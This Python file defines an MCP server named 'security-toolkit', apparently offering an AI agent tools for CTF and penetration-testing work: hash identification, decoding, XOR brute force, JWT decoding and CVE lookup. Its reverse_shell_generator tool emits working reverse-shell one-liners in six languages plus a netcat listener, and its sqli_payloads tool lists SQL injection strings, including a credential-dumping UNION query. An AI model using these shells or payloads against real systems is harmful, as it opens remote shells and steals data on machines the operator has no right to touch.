from mcp.server.fastmcp import FastMCP
import requests
import json
import base64
import hashlib
from urllib.parse import unquote, quote
import string

# Initialize FastMCP server
mcp = FastMCP("security-toolkit")

@mcp.tool()
def hash_identifier(hash_string: str) -> str:
    """Identify hash type based on length and format
    
    Args:
        hash_string: The hash to identify
    """
    hash_len = len(hash_string)
    hash_lower = hash_string.lower()
    
    identifications = []
    
    # MD5
    if hash_len == 32 and all(c in '0123456789abcdef' for c in hash_lower):
        identifications.append("MD5")
    
    # SHA-1
    if hash_len == 40 and all(c in '0123456789abcdef' for c in hash_lower):
        identifications.append("SHA-1")
    
    # SHA-256
    if hash_len == 64 and all(c in '0123456789abcdef' for c in hash_lower):
        identifications.append("SHA-256")
    
    # SHA-512
    if hash_len == 128 and all(c in '0123456789abcdef' for c in hash_lower):
        identifications.append("SHA-512")
    
    # bcrypt
    if hash_string.startswith('$2a$') or hash_string.startswith('$2b$') or hash_string.startswith('$2y$'):
        identifications.append("bcrypt")
    
    # NTLM
    if hash_len == 32 and all(c in '0123456789abcdef' for c in hash_lower):
        identifications.append("NTLM (possible)")
    
    if not identifications:
        identifications.append("Unknown hash type")
    
    result = {
        "hash": hash_string,
        "length": hash_len,
        "possible_types": identifications
    }
    
    return json.dumps(result, indent=2)


@mcp.tool()
def decode_string(encoded_string: str, encoding_type: str = "auto") -> str:
    """Decode strings with various encodings (base64, hex, url, rot13)
    
    Args:
        encoded_string: The string to decode
        encoding_type: Type of encoding (auto, base64, hex, url, rot13, binary)
    """
    results = {}
    
    if encoding_type == "auto" or encoding_type == "base64":
        try:
            decoded = base64.b64decode(encoded_string).decode('utf-8', errors='ignore')
            results["base64"] = decoded
        except:
            results["base64"] = "Failed to decode"
    
    if encoding_type == "auto" or encoding_type == "hex":
        try:
            decoded = bytes.fromhex(encoded_string.replace('0x', '').replace(' ', '')).decode('utf-8', errors='ignore')
            results["hex"] = decoded
        except:
            results["hex"] = "Failed to decode"
    
    if encoding_type == "auto" or encoding_type == "url":
        try:
            decoded = unquote(encoded_string)
            results["url"] = decoded
        except:
            results["url"] = "Failed to decode"
    
    if encoding_type == "auto" or encoding_type == "rot13":
        try:
            decoded = encoded_string.translate(str.maketrans(
                'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
                'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'
            ))
            results["rot13"] = decoded
        except:
            results["rot13"] = "Failed to decode"
    
    if encoding_type == "auto" or encoding_type == "binary":
        try:
            # Handle binary strings like "01001000 01100101"
            binary_str = encoded_string.replace(' ', '')
            if all(c in '01' for c in binary_str):
                decoded = ''.join(chr(int(binary_str[i:i+8], 2)) for i in range(0, len(binary_str), 8))
                results["binary"] = decoded
        except:
            results["binary"] = "Failed to decode"
    
    return json.dumps(results, indent=2)


@mcp.tool()
def xor_bruteforce(hex_string: str, max_key_length: int = 4) -> str:
    """Bruteforce XOR cipher with single-byte or multi-byte keys
    
    Args:
        hex_string: Hex-encoded ciphertext
        max_key_length: Maximum key length to try (default: 4)
    """
    try:
        ciphertext = bytes.fromhex(hex_string.replace('0x', '').replace(' ', ''))
    except:
        return "Invalid hex string"
    
    results = []
    
    # Single-byte XOR
    for key in range(256):
        plaintext = bytes([b ^ key for b in ciphertext])
        try:
            decoded = plaintext.decode('utf-8', errors='strict')
            # Check if result looks like readable text
            if all(c in string.printable for c in decoded):
                results.append({
                    "key": hex(key),
                    "key_decimal": key,
                    "plaintext": decoded,
                    "type": "single-byte"
                })
        except:
            continue
    
    # Multi-byte XOR (simplified for common patterns)
    if max_key_length > 1 and len(results) == 0:
        for key_len in range(2, min(max_key_length + 1, 5)):
            for key_val in range(256):
                key = bytes([key_val] * key_len)
                plaintext = bytes([ciphertext[i] ^ key[i % key_len] for i in range(len(ciphertext))])
                try:
                    decoded = plaintext.decode('utf-8', errors='strict')
                    if all(c in string.printable for c in decoded):
                        results.append({
                            "key": key.hex(),
                            "key_length": key_len,
                            "plaintext": decoded,
                            "type": "multi-byte"
                        })
                except:
                    continue
    
    if not results:
        return "No readable plaintext found with XOR bruteforce"
    
    # Return top 10 results
    return json.dumps({"results": results[:10], "total_found": len(results)}, indent=2)


@mcp.tool()
def frequency_analysis(ciphertext: str) -> str:
    """Perform frequency analysis on ciphertext (useful for substitution ciphers)
    
    Args:
        ciphertext: The ciphertext to analyze
    """
    # Count letter frequencies
    freq = {}
    total_letters = 0
    
    for char in ciphertext.upper():
        if char.isalpha():
            freq[char] = freq.get(char, 0) + 1
            total_letters += 1
    
    # Sort by frequency
    sorted_freq = sorted(freq.items(), key=lambda x: x[1], reverse=True)
    
    # Common English letter frequencies
    english_freq = "ETAOINSHRDLCUMWFGYPBVKJXQZ"
    
    result = {
        "total_letters": total_letters,
        "unique_letters": len(freq),
        "frequency_order": ''.join([item[0] for item in sorted_freq]),
        "english_frequency": english_freq,
        "detailed_frequencies": [
            {"letter": letter, "count": count, "percentage": round((count/total_letters)*100, 2)}
            for letter, count in sorted_freq
        ]
    }
    
    return json.dumps(result, indent=2)


@mcp.tool()
def jwt_decode(token: str) -> str:
    """Decode JWT token and display header, payload, and signature
    
    Args:
        token: JWT token string
    """
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return "Invalid JWT format (expected 3 parts separated by dots)"
        
        header = json.loads(base64.urlsafe_b64decode(parts[0] + '==').decode('utf-8'))
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + '==').decode('utf-8'))
        signature = parts[2]
        
        result = {
            "header": header,
            "payload": payload,
            "signature": signature,
            "algorithm": header.get('alg', 'Unknown'),
            "warning": "Verify signature before trusting this token"
        }
        
        return json.dumps(result, indent=2)
    except Exception as e:
        return f"Error decoding JWT: {str(e)}"


@mcp.tool()
def reverse_shell_generator(ip: str, port: int, shell_type: str = "bash") -> str:
    """Generate reverse shell commands for various languages/shells
    
    Args:
        ip: Attacker IP address
        port: Listening port
        shell_type: Type of shell (bash, python, nc, php, perl, ruby)
    """
    shells = {
        "bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        "nc": f"nc -e /bin/sh {ip} {port}",
        "php": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "perl": f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    }
    
    if shell_type == "all":
        result = {
            "listener_command": f"nc -lvnp {port}",
            "shells": shells
        }
    elif shell_type in shells:
        result = {
            "listener_command": f"nc -lvnp {port}",
            "shell_type": shell_type,
            "command": shells[shell_type]
        }
    else:
        return f"Unknown shell type. Available: {', '.join(shells.keys())}, all"
    
    return json.dumps(result, indent=2)


@mcp.tool()
def sqli_payloads(injection_type: str = "basic") -> str:
    """Get SQL injection payloads for testing
    
    Args:
        injection_type: Type of SQLi (basic, union, blind, error, time)
    """
    payloads = {
        "basic": [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin' --",
            "' OR '1'='1' /*",
            "') OR ('1'='1"
        ],
        "union": [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT username,password FROM users--",
            "' UNION ALL SELECT NULL,NULL,NULL--"
        ],
        "blind": [
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND SUBSTRING(@@version,1,1)='5'--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
        ],
        "error": [
            "' AND 1=CONVERT(int,(SELECT @@version))--",
            "' AND extractvalue(1,concat(0x7e,database()))--",
            "' AND updatexml(1,concat(0x7e,database()),1)--"
        ],
        "time": [
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' AND BENCHMARK(5000000,MD5('test'))--"
        ]
    }
    
    if injection_type == "all":
        result = {"payloads": payloads}
    elif injection_type in payloads:
        result = {
            "type": injection_type,
            "payloads": payloads[injection_type]
        }
    else:
        return f"Unknown injection type. Available: {', '.join(payloads.keys())}, all"
    
    return json.dumps(result, indent=2)


@mcp.tool()
def cve_lookup(cve_id: str) -> str:
    """Look up CVE details from the National Vulnerability Database
    
    Args:
        cve_id: CVE identifier (e.g., CVE-2024-1234)
    """
    try:
        response = requests.get(
            "https://services.nvd.nist.gov/rest/json/cves/2.0",
            params={"cveId": cve_id},
            timeout=10
        )
        
        if response.status_code == 200:
            data = response.json()
            
            if data.get("vulnerabilities"):
                vuln = data["vulnerabilities"][0]["cve"]
                
                result = {
                    "id": vuln["id"],
                    "published": vuln.get("published", "N/A"),
                    "lastModified": vuln.get("lastModified", "N/A"),
                    "description": vuln["descriptions"][0]["value"] if vuln.get("descriptions") else "No description",
                    "references": [ref["url"] for ref in vuln.get("references", [])[:5]]
                }
                
                return json.dumps(result, indent=2)
            else:
                return f"CVE {cve_id} not found"
        else:
            return f"Error: HTTP {response.status_code}"
            
    except Exception as e:
        return f"Error: {str(e)}"


@mcp.tool()
def port_service_lookup(port: int) -> str:
    """Look up common services running on a given port number
    
    Args:
        port: Port number to look up
    """
    common_ports = {
        21: {"service": "FTP", "description": "File Transfer Protocol"},
        22: {"service": "SSH", "description": "Secure Shell"},
        23: {"service": "Telnet", "description": "Unencrypted text communications"},
        25: {"service": "SMTP", "description": "Simple Mail Transfer Protocol"},
        53: {"service": "DNS", "description": "Domain Name System"},
        80: {"service": "HTTP", "description": "Hypertext Transfer Protocol"},
        110: {"service": "POP3", "description": "Post Office Protocol v3"},
        143: {"service": "IMAP", "description": "Internet Message Access Protocol"},
        443: {"service": "HTTPS", "description": "HTTP Secure"},
        445: {"service": "SMB", "description": "Server Message Block"},
        3306: {"service": "MySQL", "description": "MySQL Database"},
        3389: {"service": "RDP", "description": "Remote Desktop Protocol"},
        5432: {"service": "PostgreSQL", "description": "PostgreSQL Database"},
        5900: {"service": "VNC", "description": "Virtual Network Computing"},
        6379: {"service": "Redis", "description": "Redis Database"},
        8080: {"service": "HTTP-ALT", "description": "Alternative HTTP port"},
        27017: {"service": "MongoDB", "description": "MongoDB Database"},
    }
    
    if port in common_ports:
        result = {
            "port": port,
            "service": common_ports[port]["service"],
            "description": common_ports[port]["description"]
        }
    else:
        result = {
            "port": port,
            "service": "Unknown",
            "description": "No common service found for this port"
        }
    
    return json.dumps(result, indent=2)